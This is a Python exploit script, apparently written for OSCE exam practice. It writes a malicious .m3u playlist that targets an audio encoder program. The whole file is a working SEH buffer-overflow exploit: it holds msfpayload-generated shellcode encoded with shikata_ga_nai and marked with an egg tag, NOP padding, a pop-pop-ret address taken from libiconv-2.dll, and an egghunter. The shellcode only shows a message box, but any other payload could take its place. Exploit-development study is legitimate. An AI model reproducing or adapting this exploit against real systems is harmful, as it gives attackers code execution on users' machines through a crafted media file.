filename=r"C:\Documents and Settings\Admin\Desktop\OSCEPrep\audiocoder-evil-playlist.m3u"

header="http://"
buf=header+"\x90"*10
#BadChars - 00 0a 0d 5c
## msfpayload windows/messagebox title="PWNED" text="Pwned by D4v3" R | msfencode -b "\x00\x0a\x0d\x1a" -e x86/shikata_ga_nai -t py
buf += "D4v3D4v3"       #Egg tag
print "buf", len(buf)
buf += "\xbd\xf4\xf5\x02\x59\xda\xce\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x42\x31\x68\x12\x83\xe8\xfc\x03\x9c\xfb\xe0"
buf += "\xac\x85\xef\x7e\x97\x41\xd4\x74\x19\x7b\xa6\x02\x6b"
buf += "\xb2\xa3\x67\xfa\x74\xa7\x0e\xf1\xff\xc1\xf2\x82\xb9"
buf += "\x25\x80\xeb\x65\xbd\xa0\x2b\x2a\xd9\xb9\xb8\xed\xd8"
buf += "\x90\xc0\xec\xbb\x99\x53\xca\x1f\x15\xee\x2e\xeb\x7d"
buf += "\xd9\x36\xea\x97\x92\x8c\xf4\xec\xff\x30\x04\x18\x1c"
buf += "\x04\x4f\x55\xd7\xef\x4e\x87\x29\x10\x61\x97\xb6\x42"
buf += "\x06\xd7\x33\x9d\xc6\x17\xb6\xa0\x0f\x4c\x3d\x99\xf3"
buf += "\xb7\x96\xa8\xea\x33\xbc\x76\xec\xa8\x27\xfd\xe2\x65"
buf += "\x23\x5b\xe7\x78\xd8\xd0\x13\xf0\x1f\x0e\x92\x42\x04"
buf += "\xd2\xc4\x89\xf6\xe2\x2f\xda\x7e\x17\xa6\x20\xe8\x59"
buf += "\xf7\xaa\x05\x37\xe0\x2c\x2a\x48\x0f\xdb\x90\xb2\x4b"
buf += "\xa2\xc2\x58\xd8\xdc\xef\xb8\x4d\x0b\x81\x3f\x8e\x34"
buf += "\x17\xfa\x79\xa3\x44\x68\x5a\x72\xfd\x43\xa8\x5a\x99"
buf += "\xcb\xb9\xd1\x04\x79\xca\x4a\xe3\x77\x43\x94\xbd\x78"
buf += "\x06\x5d\xcb\x44\xf9\xe6\x63\xea\xb7\xa4\xf3\xf6\x63"
buf += "\x87\x13\x67\x93\xd8\x1b\x0f\x2f\x7f\xc4\xef\xc7\x2f"
buf += "\x53\xa1\x52\xe1\x80\xb5\x01\x25\x32\x4c\x5a\x4d\x0f"
buf += "\x16\xbd\xae\x07\x86\xf9\x9a\xa1\xae\x65\xc3\x2f\x57"
buf += "\x0e\x53\xc7\xc9\xab\x62\xee\x9d\x78\xa1\xfd\x14\x61"
buf += "\x98\x2f\x74\x31\x8a\x9d\x87\x65\x1d\xe2\x27\x79\x0b"
buf += "\xea"
print "buf", len(buf)
buf += "\x90"*(757-305)
print "buf", len(buf)
buf +="\xeb\x06\x90\x90"
buf +="\x56\x1b\x01\x66"         #0x66011b56 : pop ebx # pop ebp # ret  | libiconv-2.dll

hunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x44\x34\x76\x33\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buf += hunter

payload = buf + "D"* (5000-len(buf))
print "payload", len(payload)



textfile=open(filename,'w')
textfile.write(payload)
textfile.close()
